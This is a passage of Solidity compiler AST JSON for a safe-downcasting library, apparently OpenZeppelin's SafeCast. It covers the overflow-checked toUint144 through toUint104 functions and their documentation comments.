peDescriptions":{"typeIdentifier":"t_uint144","typeString":"uint144"}},"functionReturnParameters":4084,"id":4103,"nodeType":"Return","src":"8436:21:7"}]},"documentation":{"id":4078,"nodeType":"StructuredDocumentation","src":"7961:280:7","text":" @dev Returns the downcasted uint144 from uint256, reverting on\n overflow (when the input is greater than largest uint144).\n Counterpart to Solidity's `uint144` operator.\n Requirements:\n - input must fit into 144 bits"},"id":4105,"implemented":true,"kind":"function","modifiers":[],"name":"toUint144","nameLocation":"8255:9:7","nodeType":"FunctionDefinition","parameters":{"id":4081,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4080,"mutability":"mutable","name":"value","nameLocation":"8273:5:7","nodeType":"VariableDeclaration","scope":4105,"src":"8265:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4079,"name":"uint256","nodeType":"ElementaryTypeName","src":"8265:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"8264:15:7"},"returnParameters":{"id":4084,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4083,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4105,"src":"8303:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint144","typeString":"uint144"},"typeName":{"id":4082,"name":"uint144","nodeType":"ElementaryTypeName","src":"8303:7:7","typeDescriptions":{"typeIdentifier":"t_uint144","typeString":"uint144"}},"visibility":"internal"}],"src":"8302:9:7"},"scope":5451,"src":"8246:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4132,"nodeType":"Block","src":"8821:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4119,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4113,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4108,"src":"8835:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4116,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8848:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint136_$","typeString":"type(uint136)"},"typeName":{"id":4115,"name":"uint136","nodeType":"ElementaryTypeName","src":"8848:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint136_$","typeString":"type(uint136)"}],"id":4114,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"8843:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4117,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8843:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint136","typeString":"type(uint136)"}},"id":4118,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"8857:3:7","memberName":"max","nodeType":"MemberAccess","src":"8843:17:7","typeDescriptions":{"typeIdentifier":"t_uint136","typeString":"uint136"}},"src":"8835:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4126,"nodeType":"IfStatement","src":"8831:105:7","trueBody":{"id":4125,"nodeType":"Block","src":"8862:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313336","id":4121,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8914:3:7","typeDescriptions":{"typeIdentifier":"t_rational_136_by_1","typeString":"int_const 136"},"value":"136"},{"id":4122,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4108,"src":"8919:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_136_by_1","typeString":"int_const 136"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4120,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"8883:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4123,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8883:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4124,"nodeType":"RevertStatement","src":"8876:49:7"}]}},{"expression":{"arguments":[{"id":4129,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4108,"src":"8960:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4128,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8952:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint136_$","typeString":"type(uint136)"},"typeName":{"id":4127,"name":"uint136","nodeType":"ElementaryTypeName","src":"8952:7:7","typeDescriptions":{}}},"id":4130,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8952:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint136","typeString":"uint136"}},"functionReturnParameters":4112,"id":4131,"nodeType":"Return","src":"8945:21:7"}]},"documentation":{"id":4106,"nodeType":"StructuredDocumentation","src":"8470:280:7","text":" @dev Returns the downcasted uint136 from uint256, reverting on\n overflow (when the input is greater than largest uint136).\n Counterpart to Solidity's `uint136` operator.\n Requirements:\n - input must fit into 136 bits"},"id":4133,"implemented":true,"kind":"function","modifiers":[],"name":"toUint136","nameLocation":"8764:9:7","nodeType":"FunctionDefinition","parameters":{"id":4109,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4108,"mutability":"mutable","name":"value","nameLocation":"8782:5:7","nodeType":"VariableDeclaration","scope":4133,"src":"8774:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4107,"name":"uint256","nodeType":"ElementaryTypeName","src":"8774:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"8773:15:7"},"returnParameters":{"id":4112,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4111,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4133,"src":"8812:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint136","typeString":"uint136"},"typeName":{"id":4110,"name":"uint136","nodeType":"ElementaryTypeName","src":"8812:7:7","typeDescriptions":{"typeIdentifier":"t_uint136","typeString":"uint136"}},"visibility":"internal"}],"src":"8811:9:7"},"scope":5451,"src":"8755:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4160,"nodeType":"Block","src":"9330:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4147,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4141,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4136,"src":"9344:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4144,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9357:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint128_$","typeString":"type(uint128)"},"typeName":{"id":4143,"name":"uint128","nodeType":"ElementaryTypeName","src":"9357:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint128_$","typeString":"type(uint128)"}],"id":4142,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"9352:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4145,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9352:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint128","typeString":"type(uint128)"}},"id":4146,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"9366:3:7","memberName":"max","nodeType":"MemberAccess","src":"9352:17:7","typeDescriptions":{"typeIdentifier":"t_uint128","typeString":"uint128"}},"src":"9344:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4154,"nodeType":"IfStatement","src":"9340:105:7","trueBody":{"id":4153,"nodeType":"Block","src":"9371:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313238","id":4149,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9423:3:7","typeDescriptions":{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},"value":"128"},{"id":4150,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4136,"src":"9428:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4148,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"9392:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4151,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9392:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4152,"nodeType":"RevertStatement","src":"9385:49:7"}]}},{"expression":{"arguments":[{"id":4157,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4136,"src":"9469:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4156,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9461:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint128_$","typeString":"type(uint128)"},"typeName":{"id":4155,"name":"uint128","nodeType":"ElementaryTypeName","src":"9461:7:7","typeDescriptions":{}}},"id":4158,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9461:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint128","typeString":"uint128"}},"functionReturnParameters":4140,"id":4159,"nodeType":"Return","src":"9454:21:7"}]},"documentation":{"id":4134,"nodeType":"StructuredDocumentation","src":"8979:280:7","text":" @dev Returns the downcasted uint128 from uint256, reverting on\n overflow (when the input is greater than largest uint128).\n Counterpart to Solidity's `uint128` operator.\n Requirements:\n - input must fit into 128 bits"},"id":4161,"implemented":true,"kind":"function","modifiers":[],"name":"toUint128","nameLocation":"9273:9:7","nodeType":"FunctionDefinition","parameters":{"id":4137,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4136,"mutability":"mutable","name":"value","nameLocation":"9291:5:7","nodeType":"VariableDeclaration","scope":4161,"src":"9283:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4135,"name":"uint256","nodeType":"ElementaryTypeName","src":"9283:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"9282:15:7"},"returnParameters":{"id":4140,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4139,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4161,"src":"9321:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint128","typeString":"uint128"},"typeName":{"id":4138,"name":"uint128","nodeType":"ElementaryTypeName","src":"9321:7:7","typeDescriptions":{"typeIdentifier":"t_uint128","typeString":"uint128"}},"visibility":"internal"}],"src":"9320:9:7"},"scope":5451,"src":"9264:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4188,"nodeType":"Block","src":"9839:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4175,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4169,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4164,"src":"9853:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4172,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9866:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint120_$","typeString":"type(uint120)"},"typeName":{"id":4171,"name":"uint120","nodeType":"ElementaryTypeName","src":"9866:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint120_$","typeString":"type(uint120)"}],"id":4170,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"9861:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4173,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9861:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint120","typeString":"type(uint120)"}},"id":4174,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"9875:3:7","memberName":"max","nodeType":"MemberAccess","src":"9861:17:7","typeDescriptions":{"typeIdentifier":"t_uint120","typeString":"uint120"}},"src":"9853:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4182,"nodeType":"IfStatement","src":"9849:105:7","trueBody":{"id":4181,"nodeType":"Block","src":"9880:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313230","id":4177,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9932:3:7","typeDescriptions":{"typeIdentifier":"t_rational_120_by_1","typeString":"int_const 120"},"value":"120"},{"id":4178,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4164,"src":"9937:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_120_by_1","typeString":"int_const 120"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4176,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"9901:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4179,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9901:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4180,"nodeType":"RevertStatement","src":"9894:49:7"}]}},{"expression":{"arguments":[{"id":4185,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4164,"src":"9978:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4184,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9970:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint120_$","typeString":"type(uint120)"},"typeName":{"id":4183,"name":"uint120","nodeType":"ElementaryTypeName","src":"9970:7:7","typeDescriptions":{}}},"id":4186,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9970:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint120","typeString":"uint120"}},"functionReturnParameters":4168,"id":4187,"nodeType":"Return","src":"9963:21:7"}]},"documentation":{"id":4162,"nodeType":"StructuredDocumentation","src":"9488:280:7","text":" @dev Returns the downcasted uint120 from uint256, reverting on\n overflow (when the input is greater than largest uint120).\n Counterpart to Solidity's `uint120` operator.\n Requirements:\n - input must fit into 120 bits"},"id":4189,"implemented":true,"kind":"function","modifiers":[],"name":"toUint120","nameLocation":"9782:9:7","nodeType":"FunctionDefinition","parameters":{"id":4165,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4164,"mutability":"mutable","name":"value","nameLocation":"9800:5:7","nodeType":"VariableDeclaration","scope":4189,"src":"9792:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4163,"name":"uint256","nodeType":"ElementaryTypeName","src":"9792:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"9791:15:7"},"returnParameters":{"id":4168,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4167,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4189,"src":"9830:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint120","typeString":"uint120"},"typeName":{"id":4166,"name":"uint120","nodeType":"ElementaryTypeName","src":"9830:7:7","typeDescriptions":{"typeIdentifier":"t_uint120","typeString":"uint120"}},"visibility":"internal"}],"src":"9829:9:7"},"scope":5451,"src":"9773:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4216,"nodeType":"Block","src":"10348:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4203,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4197,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4192,"src":"10362:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4200,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10375:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint112_$","typeString":"type(uint112)"},"typeName":{"id":4199,"name":"uint112","nodeType":"ElementaryTypeName","src":"10375:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint112_$","typeString":"type(uint112)"}],"id":4198,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"10370:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4201,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10370:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint112","typeString":"type(uint112)"}},"id":4202,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"10384:3:7","memberName":"max","nodeType":"MemberAccess","src":"10370:17:7","typeDescriptions":{"typeIdentifier":"t_uint112","typeString":"uint112"}},"src":"10362:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4210,"nodeType":"IfStatement","src":"10358:105:7","trueBody":{"id":4209,"nodeType":"Block","src":"10389:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313132","id":4205,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10441:3:7","typeDescriptions":{"typeIdentifier":"t_rational_112_by_1","typeString":"int_const 112"},"value":"112"},{"id":4206,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4192,"src":"10446:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_112_by_1","typeString":"int_const 112"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4204,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"10410:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4207,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10410:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4208,"nodeType":"RevertStatement","src":"10403:49:7"}]}},{"expression":{"arguments":[{"id":4213,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4192,"src":"10487:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4212,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10479:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint112_$","typeString":"type(uint112)"},"typeName":{"id":4211,"name":"uint112","nodeType":"ElementaryTypeName","src":"10479:7:7","typeDescriptions":{}}},"id":4214,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10479:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint112","typeString":"uint112"}},"functionReturnParameters":4196,"id":4215,"nodeType":"Return","src":"10472:21:7"}]},"documentation":{"id":4190,"nodeType":"StructuredDocumentation","src":"9997:280:7","text":" @dev Returns the downcasted uint112 from uint256, reverting on\n overflow (when the input is greater than largest uint112).\n Counterpart to Solidity's `uint112` operator.\n Requirements:\n - input must fit into 112 bits"},"id":4217,"implemented":true,"kind":"function","modifiers":[],"name":"toUint112","nameLocation":"10291:9:7","nodeType":"FunctionDefinition","parameters":{"id":4193,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4192,"mutability":"mutable","name":"value","nameLocation":"10309:5:7","nodeType":"VariableDeclaration","scope":4217,"src":"10301:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4191,"name":"uint256","nodeType":"ElementaryTypeName","src":"10301:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10300:15:7"},"returnParameters":{"id":4196,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4195,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4217,"src":"10339:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint112","typeString":"uint112"},"typeName":{"id":4194,"name":"uint112","nodeType":"ElementaryTypeName","src":"10339:7:7","typeDescriptions":{"typeIdentifier":"t_uint112","typeString":"uint112"}},"visibility":"internal"}],"src":"10338:9:7"},"scope":5451,"src":"10282:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4244,"nodeType":"Block","src":"10857:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4231,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4225,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4220,"src":"10871:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4228,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10884:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint104_$","typeString":"type(uint104)"},"typeName":{"id":4227,"name":"uint104","nodeType":"ElementaryTypeName","src":"10884:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint104_$","typeString":"type(uint104)"}],"id":4226,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"10879:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4229,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10879:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint104","typeString":"type(uint104)"}},"id":4230,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"10893:3:7","memberName":"max","nodeType":"MemberAccess","src":"10879:17:7","typeDescriptions":{"typeIdentifier":"t_uint104","typeString":"uint104"}},"src":"10871:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4238,"nodeType":"IfStatement","src":"10867:105:7","trueBody":{"id":4237,"nodeType":"Block","src":"10898:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313034","id":4233,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10950:3:7","typeDescriptions":{"typeIdentifier":"t_rational_104_by_1","typeString":"int_const 104"},"value":"104"},{"id":4234,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4220,"src":"10955:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_104_by_1","typeString":"int_const 104"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4232,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"10919:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4235,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10919:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4236,"nodeType":"RevertStatement","src":"10912:49:7"}]}},{"expression":{"arguments":[{"id":4241,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4220,"src":"10996:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4240,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10988:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint104_$","typeString":"type(uint104)"},"typeName":{"id":4239,"name":"uint104","nodeType":"ElementaryTypeName","src":"10988:7:7","typeDescriptions":{}}},"id":4242,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10988:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint104","typeString":"uint104"}},"functionReturnParameters":4224,"id":4243,"nodeType":"Return","src":"10981:21:7"}]},"documentation":{"id":4218,"nodeType":"StructuredDocumentation","src":"10506:280:7","text":" @dev Returns the downcasted uint104 from uint256, reverting on\n overflow (when the input is greater than largest uint104).\n Counterpart to Solidity's `uint104` operator.\n Requirements:\n - input must fit into 104 bits"},"id":4245,"implemented":true,"kind":"function","modifiers":[],"name":"toUint104","nameLocation":"10800:9:7","nodeType":"FunctionDefinition","parameters":{"id":4221,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4220,"mutability":"mutable","name":"value","nameLocation":"10818:5:7","nodeType":"VariableDeclaration","scope":4245,"src":"10810:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4219,"name":"uint256","nodeType":"ElementaryTypeName","src":"10810:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10809:15:7"},"returnParameters":{"id":4224,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4223,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4245,"src":"10848:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint104","typeString":"uint104"},"typeName":{"id":4222,"name":"uint104","nodeType":"ElementaryTypeName","src":"10848:7:7","typeDescriptions":{"typeIdentifier":"t_uint104","typeS